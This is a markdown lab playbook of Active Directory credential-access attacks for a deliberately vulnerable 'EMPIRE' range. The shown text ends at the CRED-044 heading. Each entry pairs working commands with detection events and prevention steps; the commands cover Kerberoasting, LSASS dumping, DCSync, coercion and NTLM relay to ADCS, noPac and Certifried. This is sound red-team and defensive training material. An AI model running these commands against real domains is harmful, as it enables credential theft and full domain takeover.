# 03 — Credential Access (CRED-001..130, CLO-001..095)

Goal of this phase: turn "domain user `peter.parker`" into "hashes / tickets / certs for higher-privileged principals." Every entry below is wired up in EMPIRE via the Ansible `vuln-cred-access.yml`, `vuln-kerberos.yml`, `vuln-adcs-esc.yml`, and the ADCS role.

---

### CRED-001 — Kerberoasting
**What it is:** request a TGS for any account with an SPN; the TGS is partly encrypted with the service account's NT hash. Crack offline with hashcat.
**Why it works here:** `svc_vision`, `svc_jarvis`, `svc_legacy` have SPNs and weak passwords (`Summer2023!`, `SithLord123!`).
**Tools:** `impacket-GetUserSPNs`, `Rubeus`, `hashcat -m 13100`.
**Steps:**
```bash
impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
   -request -outputfile spn.hashes
hashcat -m 13100 spn.hashes /usr/share/wordlists/rockyou.txt
```
```powershell
.\Rubeus.exe kerberoast /outfile:spn.hashes /nowrap
```
**Detection:** Event `4769` (TGS request) with `Ticket Encryption Type: 0x17` (RC4-HMAC) — modern services use AES; RC4 requests are roast-shaped. Honeypot SPN account = high-fidelity tripwire.
**Prevention:** AES-only on service accounts (`msDS-SupportedEncryptionTypes=0x18`); gMSAs (auto-rotated 120-day passwords); long random passwords > 25 chars.

---

### CRED-002 — AS-REP Roasting
**What it is:** for accounts with `DONT_REQUIRE_PREAUTH`, the AS-REP is encrypted with the user's NT key without proof of identity — crack offline.
**Why it works here:** `svc_nopreauth`.
**Tools:** `impacket-GetNPUsers`, `Rubeus asreproast`, `hashcat -m 18200`.
**Steps:** see REC-013 for collection. Cracking:
```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```
**Detection:** Event `4768` with pre-auth type 0.
**Prevention:** unset `DONT_REQ_PREAUTH` on every account.

---

### CRED-003 — Password Spray
**What it is:** try one (very) common password against every account. Stays under lockout because each account sees one attempt.
**Why it works here:** 15% of users have `SithLord123!`; lockout threshold = 0.
**Tools:** `nxc smb`, `kerbrute`.
**Steps:**
```bash
kerbrute passwordspray -d empire.local --dc 10.10.0.10 users.txt 'SithLord123!'
nxc smb 10.10.0.10 -u users.txt -p 'SithLord123!' --continue-on-success
```
**Detection:** Event `4625` (failed logon) and `4771` (Kerberos pre-auth failed) across many accounts from one source IP in a short window. Defender for Identity "password spray" alert.
**Prevention:** Smart Account Lockout, MFA, Azure AD password protection, ban common passwords (`Banned Password List`).

---

### CRED-004 — Credential Hunting on a workstation
**What it is:** local admin = read PuTTY/WinSCP profiles, browser saved passwords, DBeaver connections, `cmdkey /list`, `runas /savecred`, Sticky Notes.
**Why it works here:** stock workstation, no LSA hardening.
**Tools:** `LaZagne`, `mimikatz dpapi::`, `SharpChromium`, `WinPwn`.
**Steps:**
```powershell
.\LaZagne.exe all
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials
```
**Detection:** EDR sees `lsasrv.dll` open from non-MS-signed process; AMSI sees LaZagne in PowerShell.
**Prevention:** Credential Guard, browser-managed-by-org (no local passwords), regular cred-hygiene training.

---

### CRED-005 — LSASS Memory Dump (Mimikatz)
**What it is:** read LSASS process memory, extract logon sessions = NT hashes, Kerberos keys, plaintext (older Windows / WDigest).
**Why it works here:** Defender disabled. `WDigest=1` enabled on some hosts (plaintext capture).
**Tools:** `mimikatz`, `lsassy`, `nanodump`, `procdump64`, `comsvcs.dll MiniDump`.
**Steps:**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
```bash
lsassy -u Administrator -p 'EmpireLab2024!' 10.10.0.13
# LOLBin variant:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Temp\l.dmp full
```
**Detection:** Sysmon Event `10` (process access) targeting `lsass.exe` from a non-MS-signed process; ProcessAccess masks `0x1010`/`0x1410`. EDR has dedicated rules.
**Prevention:** Credential Guard (LSA isolation), `RunAsPPL=1`, Protected Process Light, ASR rule "Block credential stealing from LSASS."

---

### CRED-006 — SAM Database Extraction
**What it is:** copy/read `C:\Windows\System32\config\SAM` + `SYSTEM` hive → extract local user NT hashes. With `SeBackupPrivilege` you can read locked files.
**Why it works here:** `heimdall` has Backup Operators.
**Tools:** `reg save`, `secretsdump.py`, `pypykatz`.
**Steps:**
```cmd
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
```
```bash
impacket-secretsdump -sam sam -system system LOCAL
```
**Detection:** Event `4663` for SAM/SYSTEM hive access by non-system process.
**Prevention:** Credential Guard for local accounts; LAPS so local admin is unique per host; restrict Backup Operators.

---

### CRED-007 — NTDS.dit via Volume Shadow Copy
**What it is:** snapshot `C:\` on a DC, copy `NTDS.dit` + `SYSTEM`, extract every domain hash offline.
**Why it works here:** Backup Operators have access on `coruscant`.
**Tools:** `vssadmin`, `ntdsutil`, `wmiexec.py`, `secretsdump.py`.
**Steps:**
```cmd
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q
```
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
# remote:
impacket-secretsdump -just-dc-ntlm empire.local/Administrator:'EmpireLab2024!'@10.10.0.10
```
**Detection:** Event `8222` (VSS), `4661` (NTDS.dit handle), unusual SMB outbound from DC.
**Prevention:** Tier-0 isolation; restrict who is in Backup Operators / Server Operators; Defender for Identity DCSync alert.

---

### CRED-008 — Shadow Credentials (msDS-KeyCredentialLink)
**What it is:** if you have `GenericWrite` on a target user/computer, you can append a public key to `msDS-KeyCredentialLink`. Then PKINIT-auth as that user with your matching private key → get their TGT (and NT hash via UnPAC).
**Why it works here:** `nick.fury` group has GenericWrite on multiple users.
**Tools:** `pyWhisker`, `Certipy shadow`, `Rubeus`.
**Steps:**
```bash
certipy shadow auto -u peter.parker@empire.local -p 'EmpireLab2024!' -account svc_vision
# certipy prints both the cert and the resulting NT hash
```
**Detection:** Event `5136` (object modified) on `msDS-KeyCredentialLink`. ATA/MDI flag.
**Prevention:** restrict who can write `msDS-KeyCredentialLink` (audit ACLs); enable strict KDC cert validation; consider KeyCredential admin tier.

---

### CRED-009 — Reversible Password Encryption
**What it is:** the `ALLOW_REVERSIBLE_PASSWORD_ENCRYPTION` flag stores the password in a recoverable form. DCSync the user and recover plaintext.
**Why it works here:** `heimdall` has this set.
**Tools:** `secretsdump.py --reversible`, mimikatz `lsadump::dcsync`.
**Steps:**
```bash
impacket-secretsdump -just-dc-user heimdall empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10
# look for "RevPlaintext" / plaintext field
```
**Detection:** Event `4738` (user account changed) when the flag is set.
**Prevention:** `Set-ADUser -AllowReversiblePasswordEncryption $false` on every account; remove fine-grained password policies that enable it.

---

### CRED-010 — Token Impersonation
**What it is:** when a service runs as user X and you're SYSTEM/admin on the box, you can steal X's token and act as X without their password.
**Why it works here:** services run as service accounts, no privilege separation.
**Tools:** `incognito` (mimikatz), `Invoke-TokenManipulation`, `Rubeus tgtdeleg`.
**Steps:**
```powershell
.\mimikatz.exe "token::elevate" "token::list" "token::use /id:0xN"
Invoke-TokenManipulation -ImpersonateUser -Username 'corp\svc_vision'
```
**Detection:** Sysmon `4624` Logon Type 9 from suspicious processes; EDR token-impersonation rules.
**Prevention:** run services with the minimum needed privilege; Protected Users group for sensitive accounts; sensitive accounts marked "Account is sensitive and cannot be delegated."

---

### CRED-011 — Pass-the-Hash (PtH)
**What it is:** authenticate to NTLM-accepting services with the NT hash directly — no plaintext needed.
**Why it works here:** NTLM is enabled everywhere; SMB signing not required.
**Tools:** `nxc smb -H`, `psexec.py -hashes`, `mimikatz sekurlsa::pth`.
**Steps:**
```bash
nxc smb 10.10.0.13 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
impacket-psexec empire.local/Administrator@10.10.0.10 -hashes :31d6...
```
**Detection:** Event `4624` Logon Type 3 + Logon Process `NtLmSsp` from one source to many destinations; Microsoft ATA / MDI "Pass-the-Hash" alert.
**Prevention:** disable NTLM where possible (`Network security: Restrict NTLM`); Protected Users (no NTLM); LAPS; tier-0 isolation.

---

### CRED-012 — Pass-the-Ticket (PtT)
**What it is:** inject an existing Kerberos TGT/TGS into your session and use it for auth.
**Why it works here:** Kerberos default behavior.
**Tools:** `Rubeus ptt`, `mimikatz kerberos::ptt`, `impacket -k`.
**Steps:**
```powershell
.\Rubeus.exe ptt /ticket:base64TGT
# or
.\mimikatz.exe "kerberos::ptt ticket.kirbi"
```
```bash
export KRB5CCNAME=peter.parker.ccache
impacket-psexec -k -no-pass empire.local/peter.parker@coruscant.empire.local
```
**Detection:** Event `4624` Logon Type 3 + `Authentication Package: Kerberos` from an account whose normal logon location differs (TGT theft). Hard to detect without baseline.
**Prevention:** Protected Users (TGTs not cached); shorter TGT lifetime; Credential Guard.

---

### CRED-013 — DCSync (Replicate Directory Changes)
**What it is:** `DRSUAPI::GetNCChanges` lets a principal pull password hashes for any user. Requires `Replicating Directory Changes`+ `RDC-All`. Mimikatz/secretsdump speak DRSR.
**Why it works here:** `doctor.strange` granted both rights; Backup Operators inherits them in some configs.
**Tools:** `secretsdump.py -just-dc`, `mimikatz lsadump::dcsync`.
**Steps:**
```bash
impacket-secretsdump empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10 -just-dc-ntlm
```
```powershell
.\mimikatz.exe "lsadump::dcsync /domain:empire.local /user:Administrator"
```
**Detection:** Event `4662` with object access `DS-Replication-Get-Changes` from a non-DC source IP — Defender for Identity native alert.
**Prevention:** audit who has `Replicating Directory Changes / All / In Filtered Set` — should be DCs only.

---

### CRED-014 — GenericAll on DC computer object
**What it is:** GenericAll permissions over a Domain Controller computer object allow an attacker to modify the computer object's attributes, perform RBCD (Resource-Based Constrained Delegation), or perform Shadow Credentials / write `msDS-KeyCredentialLink` to impersonate the Domain Controller, leading to DCSync.
**Why it works here:** `svc_bobafett2` is granted GenericAll on `coruscant` computer object.
**Tools:** `pyWhisker`, `Certipy`, `impacket-getST`, `Rubeus`.
**Steps:**
```bash
# Write shadow credentials to the DC computer object (coruscant$)
certipy shadow auto -u svc_bobafett2@empire.local -p 'Darryl2024!' -account coruscant$ -dc-ip 10.10.0.10
# Authenticate and retrieve the NT hash of coruscant$
certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10
# Execute DCSync using the machine hash
impacket-secretsdump -k -no-pass -hashes :<coruscant_nt_hash> empire.local/coruscant\$@10.10.0.10
```
**Detection:** Event `5136` (Directory Service Object Modified) on the Domain Controller computer object's `msDS-KeyCredentialLink` or `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
**Prevention:** Restrict permissions on Tier 0 computer objects (like DCs). Only Domain Admins and System Administrators should have write access.

---

### CRED-015 — DCShadow
**What it is:** instead of *pulling* secrets, *push* changes by impersonating a DC (Mimikatz registers an SPN, briefly becomes a DC, pushes attribute writes). Lower-fidelity logging because changes look like replication.
**Why it works here:** Schema Admins delegation is loose.
**Tools:** mimikatz `lsadump::dcshadow`.
**Steps:** Mimikatz instance 1 (push): `lsadump::dcshadow /object:CN=peter.parker,... /attribute:primaryGroupID /value:512`. Instance 2 (server): `lsadump::dcshadow /push`.
**Detection:** Event `4742` (computer object created with SPNs `GC/...` `E3514235-4B06-...`), abnormal replication source. MDI native alert.
**Prevention:** remove Schema/Domain Admins write to Configuration container; monitor replication metadata.

---

### CRED-016 — Constrained Delegation Abuse (S4U2Self/S4U2Proxy)
**What it is:** an account with `msDS-AllowedToDelegateTo` set can request a TGS *to that target SPN* on behalf of *any* user (S4U2Proxy). With `TrustedToAuthForDelegation` you can also call S4U2Self first → impersonate anyone to anywhere in the constrained list.
**Why it works here:** `svc_vision` has TRUSTED_TO_AUTH_FOR_DELEGATION + delegation to `CIFS/scarif`.
**Tools:** `Rubeus s4u`, `impacket-getST`.
**Steps:**
```bash
impacket-getST -spn cifs/scarif.empire.local \
   -impersonate Administrator empire.local/svc_vision:'Summer2023!' -dc-ip 10.10.0.10
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass scarif.empire.local
```
**Detection:** Event `4769` for S4U2Self/S4U2Proxy patterns; abnormal SPN target list.
**Prevention:** **Resource-Based** Constrained Delegation only; never set classic constrained delegation; never set TRUSTED_TO_AUTH_FOR_DELEGATION; Protected Users.

---

### CRED-017 — Resource-Based Constrained Delegation (RBCD)
**What it is:** `msDS-AllowedToActOnBehalfOfOtherIdentity` on a *target* lists principals allowed to delegate to it. If you can write that attribute on a target, you can RBCD-attack from any controllable principal. Combine with MachineAccountQuota=10 to create your own computer.
**Why it works here:** `tatooine$` allows `svc_vision$` to act on behalf of; `MachineAccountQuota=10`.
**Tools:** `impacket-addcomputer`, `rbcd.py`, `Rubeus s4u`.
**Steps:**
```bash
impacket-addcomputer -computer-name 'evil$' -computer-pass 'P@ssw0rd!' \
   empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
impacket-rbcd -delegate-from 'evil$' -delegate-to 'tatooine$' \
   -action write empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
impacket-getST -spn cifs/tatooine.empire.local -impersonate Administrator \
   empire.local/evil\$:'P@ssw0rd!' -dc-ip 10.10.0.10
```
**Detection:** Event `5136` modifying `msDS-AllowedToActOnBehalfOfOtherIdentity`. Defender for Identity native alert.
**Prevention:** `MachineAccountQuota=0`; restrict who can write that attribute; monitor for changes.

---

### CRED-018 — Unconstrained Delegation Abuse
**What it is:** a host with `TRUSTED_FOR_DELEGATION` caches incoming users' TGTs in LSA. Coerce a privileged account (e.g. DC$) to authenticate to such a host, and you can extract their TGT.
**Why it works here:** `scarif` has unconstrained delegation; PrinterBug works against DCs.
**Tools:** `Rubeus monitor`, `printerbug.py`, `mimikatz sekurlsa::tickets /export`.
**Steps:**
```powershell
# on scarif (admin):
.\Rubeus.exe monitor /interval:5 /filteruser:coruscant$
# from any low-priv:
python3 printerbug.py empire.local/peter.parker:'EmpireLab2024!'@coruscant.empire.local scarif.empire.local
# Rubeus catches coruscant$ TGT; PtT, DCSync.
```
**Detection:** Event `4624` Logon Type 3 from DC$ to unconstrained host; Defender for Identity unconstrained delegation exposure.
**Prevention:** disable unconstrained delegation entirely (use RBCD); add sensitive accounts to Protected Users / "sensitive and cannot be delegated."

---

### CRED-019 — PrintNightmare (CVE-2021-34527)
**What it is:** RpcAddPrinterDriverEx lets you load arbitrary DLLs as SYSTEM via the Print Spooler. Code exec on every spooler-running host as SYSTEM.
**Why it works here:** unpatched spoolers; Point-and-Print warnings disabled.
**Tools:** `CVE-2021-1675.py`, `PrintNightmare.py`, `SharpPrintNightmare`.
**Steps:**
```bash
python3 cve-2021-1675.py empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 '\\10.10.0.100\share\add_user.dll'
```
**Detection:** Event `316` (PrintService/Admin) with `PrinterDriverInstalled`; Event `808` driver load failures from non-admin contexts.
**Prevention:** disable Print Spooler everywhere it's not used (especially DCs); patch (KB5005010+); set `RestrictDriverInstallationToAdministrators=1`.

---

### CRED-020 — PetitPotam → NTLM Relay to ADCS (ESC8)
**What it is:** `EfsRpcOpenFileRaw` coerces the target into authenticating to a UNC of your choice — works unauthenticated against `MS-EFSRPC`. Relay the NTLM auth to ADCS Web Enrollment (HTTP, no EPA) and request a cert for any user (including DC$).
**Why it works here:** EFSRPC reachable; CA web enrollment HTTP, no Extended Protection.
**Tools:** `PetitPotam.py`, `Coercer`, `ntlmrelayx.py`, `gettgtpkinit.py`.
**Steps:**
```bash
ntlmrelayx.py -t http://endor.empire.local/certsrv/certfnsh.asp \
   --adcs --template DomainController -smb2support
python3 PetitPotam.py -u peter.parker -p 'EmpireLab2024!' -d empire.local 10.10.0.100 10.10.0.10
# Pipe the base64 cert to gettgtpkinit:
python3 gettgtpkinit.py empire.local/coruscant\$ -cert-pfx coruscant.pfx coruscant.ccache
```
**Detection:** Event `4624` from DC$ to attacker IP via NTLM; ADCS Event `4886`/`4887` (cert issued) with mismatch between requester and subject; MDI/ATA "PetitPotam" alert.
**Prevention:** disable NTLM auth on ADCS web enrollment (Kerberos-only) + enable EPA; patch ADV210003; block `EfsRpcOpenFileRaw` (MS-EFSRPC) via RPC filter / KB5005413.

---

### CRED-021 — DFSCoerce (MS-DFSNM)
**What it is:** like PetitPotam but via `NetrDfsAddStdRoot`. Same outcome — coerced NTLM auth.
**Why it works here:** DFS namespace server reachable.
**Tools:** `dfscoerce.py`, `Coercer`.
**Steps:**
```bash
ntlmrelayx.py -t ldaps://coruscant.empire.local --delegate-access -smb2support
python3 dfscoerce.py -u peter.parker -p 'EmpireLab2024!' -d empire.local 10.10.0.100 10.10.0.10
```
**Detection:** RPC `MS-DFSNM` calls from non-admin accounts.
**Prevention:** disable DFS Namespaces where not needed; force SMB signing + LDAPS channel binding.

---

### CRED-022 — PrinterBug / SpoolSample
**What it is:** `RpcRemoteFindFirstPrinterChangeNotificationEx` coerces auth. Works from any authenticated user against any spooler.
**Why it works here:** Print Spooler on by default.
**Tools:** `printerbug.py`, `SpoolSample.exe`, `Coercer`.
**Steps:**
```bash
# Trigger coercion from a domain controller (coruscant) to attacker listener (10.10.0.100)
python3 printerbug.py empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 10.10.0.100
```
**Detection:** Event `4768` from DC$ to unusual destinations; Print Service Admin Event `808`.
**Prevention:** disable Print Spooler on DCs (KB5005413 — no impact); StopAndDisableHyperVRelayedRPC.

---

### CRED-023 — sAMAccountName Spoofing (noPac)
**What it is:** CVE-2021-42278/42287. Create a machine account, rename it to a DC's name (without the `$`), request a TGT, then rename back — the KDC issues PAC for the DC. S4U2Self → DA.
**Why it works here:** `MachineAccountQuota=10`, unpatched (kernel-mode patch missing in lab).
**Tools:** `noPac.py`, `Rubeus + Pachine`, `impacket-getTGT`.
**Steps:**
```bash
python3 noPac.py -dc-ip 10.10.0.10 empire.local/peter.parker:'EmpireLab2024!' \
   -dc-host coruscant.empire.local -shell
```
**Detection:** Event `4741` (computer created) + `4742` (renamed) + `4624` Logon Type 3 with mismatched names; MDI alert.
**Prevention:** patch (KB5008380+); `MachineAccountQuota=0`.

---

### CRED-024 — Certifried (CVE-2022-26923 / ESC22)
**What it is:** abuse `dNSHostName` write on a machine account — set the DC's dNSHostName on your computer, enroll the Machine template, get a cert valid as DC$ → DCSync.
**Why it works here:** unpatched + Machine template enrollable by Domain Computers.
**Tools:** `Certipy`, `Certify`.
**Steps:**
```bash
impacket-addcomputer -computer-name 'attack$' -computer-pass 'P@ssw0rd!' \
   empire.local/peter.parker:'EmpireLab2024!'
certipy account update -u peter.parker@empire.local -p 'EmpireLab2024!' \
   -user attack$ -dns coruscant.empire.local
certipy req -u 'attack$@empire.local' -p 'P@ssw0rd!' -ca corp-CA-CA -template Machine \
   -target endor.empire.local
certipy auth -pfx attack.pfx -dc-ip 10.10.0.10
# DC$ TGT -> DCSync
```
**Detection:** Event `5136` modifying `dNSHostName`; ADCS event for cert issuance with mismatched SAN.
**Prevention:** patch (KB5014754); strong cert mapping (StrongCertificateBindingEnforcement=2); remove non-admin write on `dNSHostName`.

---

### CRED-025 — WebClient Service Abuse
**What it is:** if WebClient is running on a target, it'll honor a `\\host@SSL@port\file` UNC and do NTLM auth over HTTP (WebDAV) — relayable everywhere.
**Why it works here:** WebClient enabled in lab.
**Tools:** `PetitPotam`, `Coercer --transport http`.
**Steps:**
```bash
ntlmrelayx.py -t ldaps://coruscant.empire.local --delegate-access --no-smb-server -smb2support -http-port 80
python3 PetitPotam.py -u peter.parker -p 'EmpireLab2024!' \
   '\\attacker@80/foo' scarif.empire.local
```
**Detection:** WebDAV PROPFIND in IIS logs; WebClient service start events.
**Prevention:** disable WebClient on servers; force SMB; LDAP channel binding.

---

### CRED-026 — ADIDNS Wildcard Poisoning
**What it is:** any Authenticated User can create records in AD-integrated DNS. Insert a wildcard `*` record → catch fallthrough lookups (printers, wpad, file servers).
**Why it works here:** default ADIDNS permissions.
**Tools:** `Invoke-DNSUpdate`, `dnstool.py`, `krbrelayx/dnstool.py`.
**Steps:**
```bash
python3 dnstool.py -u 'corp\peter.parker' -p 'EmpireLab2024!' \
   -r '*' -d 10.10.0.100 --action add 10.10.0.10
```
**Detection:** Event `5136` on `dnsNode` objects under `MicrosoftDNS`.
**Prevention:** restrict `Create child` on `DnsZone` to admins only; use DNSSEC; isolate ADIDNS modifications via ACL.

---

### CRED-027 — ADCS Disable SAN Validation (ESC6 variant)
**What it is:** the CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` lets requesters add SAN to *any* enrollment. Combined with a Client Auth template = request cert with `Administrator@empire.local` as SAN → DA cert.
**Why it works here:** CA registry flag set.
**Tools:** `Certipy req --upn`, `Certify request /altname:`.
**Steps:**
```bash
certipy req -u peter.parker@empire.local -p 'EmpireLab2024!' -ca corp-CA-CA \
   -template User -upn Administrator@empire.local -target endor.empire.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```
**Detection:** ADCS Event `4886`/`4887` where requester ≠ SAN; MDI ESC6 alert.
**Prevention:** clear EDITF flag: `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`; require manager approval on sensitive templates.

---

### CRED-028 — ESC15 / CVE-2024-49019 (EKUwu)
**What it is:** schema-v1 templates can have arbitrary Application Policies in the CSR — request a cert with both Client Auth and a SAN spec that the schema-v1 template allows but doesn't enforce.
**Why it works here:** legacy v1 templates published.
**Tools:** `Certipy ≥ 4.8`.
**Steps:**
```bash
certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA \
   -template WebServer -application-policies 'Client Authentication' \
   -upn Administrator@empire.local
```
**Detection:** ADCS event with non-standard Application Policy OIDs.
**Prevention:** patch (KB5044284); migrate v1 templates to v2+; remove Client Auth from broad templates.

---

### CRED-029 — NTLMSSP Hash Downgrade
**What it is:** force NetNTLMv1 by setting `LMCompatibilityLevel <= 2` and capturing — NTLMv1 is trivially crackable to NT hash via `crack.sh`.
**Why it works here:** legacy compat level on some hosts.
**Tools:** `Responder --lm`, `crack.sh`.
**Steps:** Responder with `--lm`; submit captured `:::1122334455667788:::` blob.
**Detection:** Event `4624`/`4625` `Authentication Package: NTLM V1`.
**Prevention:** `LMCompatibilityLevel=5` (NTLMv2 only) via GPO.

---

### CRED-030 — GPP Password Extraction (MS14-025)
**What it is:** legacy Group Policy Preferences stored an AES-encrypted `cpassword` in `Groups.xml`/`Drives.xml`. The AES key is public (Microsoft published it). Decrypt → cleartext local admin / service account.
**Why it works here:** we left old GPP file in SYSVOL.
**Tools:** `Get-GPPPassword`, `gpp-decrypt`.
**Steps:** see REC-015.
**Detection:** SYSVOL grep alerts.
**Prevention:** delete every GPP `cpassword` file; KB2962486.

---

### CRED-031 — AS-ROAST variant
**What it is:** Request a TGT for an account that does not require pre-authentication, allowing the capture of the AS-REP response which can then be cracked offline.
**Why it works here:** `no_preauth_svc` has "Do not require Kerberos preauthentication" set.
**Tools:** `impacket-GetNPUsers`, `Rubeus`, `hashcat`.
**Steps:**
```bash
impacket-GetNPUsers empire.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip 10.10.0.10
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```
```powershell
.\Rubeus.exe asreproast /user:no_preauth_svc /outfile:asrep.hashes
```
**Detection:** Event `4768` (Kerberos Authentication Ticket Request) with pre-authentication type 0.
**Prevention:** Uncheck "Do not require Kerberos preauthentication" on all user accounts in Active Directory.

---

### CRED-032 — LDAP Simple Bind Interception
**What it is:** LDAP simple binds on port 389 send credentials in cleartext. Sniff = creds.
**Why it works here:** LDAP signing not required.
**Tools:** `tcpdump`, `bettercap`, `Wireshark`.
**Steps:**
```bash
sudo tcpdump -i virbr1 -A 'port 389 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x60'
```
**Detection:** Event `2887`/`2889` (LDAP signing/binding diagnostics).
**Prevention:** "LDAP server signing requirements = Require Signing"; force LDAPS; disable simple bind.

---

### CRED-033 — LAPS Password Read
**What it is:** `ms-Mcs-AdmPwd` (legacy LAPS) or `msLAPS-Password` (Windows LAPS) stores the local Administrator password. Read access → local admin everywhere.
**Why it works here:** `IT_Team` delegated read on legacy LAPS attribute.
**Tools:** `nxc ldap --laps`, `LAPSDumper`, `Get-LAPSADPassword`.
**Steps:**
```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --laps
python3 laps.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -dc-ip 10.10.0.10
```
**Detection:** Event `4662` reading `ms-Mcs-AdmPwd` attribute (GUID known).
**Prevention:** audit who has `All Extended Rights` / `Read ms-Mcs-AdmPwd` on OUs; migrate to Windows LAPS with encryption.

---

### CRED-034 — gMSA Password Read
**What it is:** `msDS-ManagedPassword` returns the current+previous gMSA NT keys to anyone in `PrincipalsAllowedToRetrieveManagedPassword`.
**Why it works here:** `nick.fury` is in the list for `gmsa_ultron$`.
**Tools:** `gMSADumper`, `nxc ldap --gmsa`.
**Steps:**
```bash
python3 gMSADumper.py -u peter.parker -p 'EmpireLab2024!' -d empire.local
```
**Detection:** Event `4662` reading `msDS-ManagedPassword` from non-host account.
**Prevention:** lock down `PrincipalsAllowedToRetrieveManagedPassword` to the intended host only.

---

### CRED-035 — Credential Manager Saved Creds
**What it is:** Windows Credential Manager (`cmdkey`) holds saved RDP/SMB creds per user. Local-admin you can read another user's via DPAPI.
**Why it works here:** standard Windows behavior.
**Tools:** `cmdkey`, `mimikatz dpapi::cred`, `SharpDPAPI`.
**Steps:**
```powershell
cmdkey /list
SharpDPAPI.exe credentials /unprotect
```
**Detection:** DPAPI key access from non-user context.
**Prevention:** Credential Guard; train users not to save admin creds.

---

### CRED-036 — Browser Credential Extraction
**What it is:** Chrome/Edge/Firefox saved passwords; encrypted with user's DPAPI master key.
**Tools:** `SharpChromium`, `mimikatz dpapi::chrome`.
**Steps:**
```powershell
SharpChromium.exe all
```
**Detection:** access to `Login Data` SQLite file by non-browser.
**Prevention:** managed browser policy; disable saved passwords for managed identities.

---

### CRED-037 — AzureAD SSO Token Extraction
**What it is:** Hybrid SSO uses `AZUREADSSOACC$` computer object's NT hash to sign tickets. With the hash you forge tickets as any synced user.
**Why it works here:** placeholder if hybrid PTA/PHS is wired up. (Not enabled in default EMPIRE topology.)
**Tools:** `AADInternals`.
**Steps:**
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
Open-AADIntOffice365Portal -AccessToken $token
```
**Detection:** Entra ID sign-in logs anomalous device location.
**Prevention:** rotate `AZUREADSSOACC$` regularly; Conditional Access; FIDO2.

---

### CRED-038 — SSP Injection
**What it is:** load `mimilib.dll` as an LSA Security Support Provider — every logon's plaintext gets logged to disk.
**Why it works here:** admin on DC + Defender off.
**Tools:** mimikatz `misc::memssp`, `mimilib.dll`.
**Steps:**
```powershell
.\mimikatz.exe "privilege::debug" "misc::memssp"
# every subsequent logon -> %SystemRoot%\System32\mimilsa.log
```
**Detection:** registry write to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`.
**Prevention:** Credential Guard / RunAsPPL on LSASS; restrict who can edit LSA registry keys.

---

### CRED-039 — SeBackupPrivilege → SAM/SECURITY/NTDS
**What it is:** `SeBackupPrivilege` bypasses file ACLs for read. Member of Backup Operators on a DC → read `NTDS.dit` and the registry SYSTEM hive → secretsdump offline.
**Why it works here:** `heimdall` has it.
**Tools:** `robocopy /B`, `reg save`, `diskshadow`.
**Steps:**
```cmd
diskshadow /s c:\temp\shadow.txt
robocopy /B \\coruscant\C$\Windows\NTDS\ C:\Temp\ntds NTDS.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```
**Detection:** Event `4673` `SeBackupPrivilege` used by non-backup software.
**Prevention:** restrict Backup Operators membership; tiered admin model.

---

### CRED-040 — SeTrustedCredManAccessPrivilege → DPAPI
**What it is:** A highly sensitive privilege (`SeTrustedCredManAccessPrivilege`) that allows a process/user to access the Windows Credential Manager and retrieve stored credentials for all users.
**Why it works here:** `Asset_Owners` group is assigned `SeTrustedCredManAccessPrivilege`.
**Tools:** `secedit`, custom scripts.
**Steps:**
```powershell
# Check if SeTrustedCredManAccessPrivilege is granted
whoami /priv
# Retrieve all stored credentials in PasswordVault using the privilege
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] | Out-Null
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll()
```
**Detection:** Event `4673` (Sensitive Privilege Use) indicating the use of `SeTrustedCredManAccessPrivilege`.
**Prevention:** Never assign `SeTrustedCredManAccessPrivilege` to standard users or service accounts.

---

### CRED-041 — SeDebugPrivilege → LSASS
**What it is:** open `lsass.exe` for `PROCESS_VM_READ` → MiniDump → secretsdump.
**Why it works here:** Administrators have SeDebugPrivilege by default.
**Tools/Steps:** see CRED-005.
**Detection:** Sysmon `10` lsass-access from non-MS-signed process.
**Prevention:** Credential Guard / RunAsPPL.

---

### CRED-042 — SeImpersonatePrivilege → Potato
**What it is:** the Potato family abuses `SeImpersonate` granted to service accounts (IIS AppPool, SQL service) to coerce SYSTEM auth → impersonate token → SYSTEM. See PE-001 / PE-052.

---

### CRED-043 — RID Hijacking
**What it is:** with SYSTEM on a workstation, overwrite SAM `F` value for an attacker account so its RID becomes 500 → permanent local administrator regardless of password resets.
**Tools:** [`SecPwn/rid-hijack`](https://github.com/r4wd3r/RID-Hijacking), `mimikatz misc::regedit`.
**Steps:** offline SAM edit.
**Detection:** Event `4660`/`4663` on `SAM` hive.
**Prevention:** monitor SAM modifications; Credential Guard for local; LAPS.

---

### CRED-044 — Hash Dump via VSS
